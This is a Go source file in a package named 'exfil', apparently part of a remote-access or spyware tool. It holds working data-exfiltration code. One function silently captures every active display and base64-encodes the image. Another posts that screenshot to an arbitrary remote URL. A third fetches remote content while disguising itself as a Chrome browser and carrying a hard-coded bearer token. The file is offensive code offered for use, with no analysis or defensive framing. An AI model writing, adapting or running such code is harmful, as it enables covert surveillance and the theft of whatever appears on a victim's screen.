package exfil

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"

	"github.com/kbinani/screenshot"
	"github.com/pbberlin/tools/conv"
)

func GetData(url string) string {

	client := http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req.Header = http.Header{
		"Accept":        []string{"*/*"},
		"User-Agent":    []string{"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"},
		"Content-Type":  []string{"html/text"},
		"Connection":    []string{"Keep-Alive"},
		"Cache-Control": []string{"no-cache"},
		"Authorization": []string{"Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikdvb2QgbHVjayBoYWNraW5nIG1lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5Q3f35cNecsJ39pZ4C1oPyJ_3CvFyYj7l9reoL0nDzIuenagPJpSJ9Po1Y1Ungn8"},
	}

	res, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}
	//Convert the body to type string
	sb := string(body)
	return sb
}
func ScreenShot() string {

	str_b64 := ""

	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
		file, _ := os.Create(fileName)
		defer file.Close()
		str_b64 = conv.Rgba_img_to_base64_str(img)
		return str_b64

		// png.Encode(file, img)
		// println(str_b64)
		// fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return str_b64
}

//Image in base64 with URL encoded
func SendIMG(url_target string) {
	var image string = ScreenShot()
	var data string = fmt.Sprint(image)
	data_post := url.Values{
		"Image": {data},
	}
	resp, err := http.PostForm(url_target, data_post)
	if err != nil {
		fmt.Print(resp)
	}
}
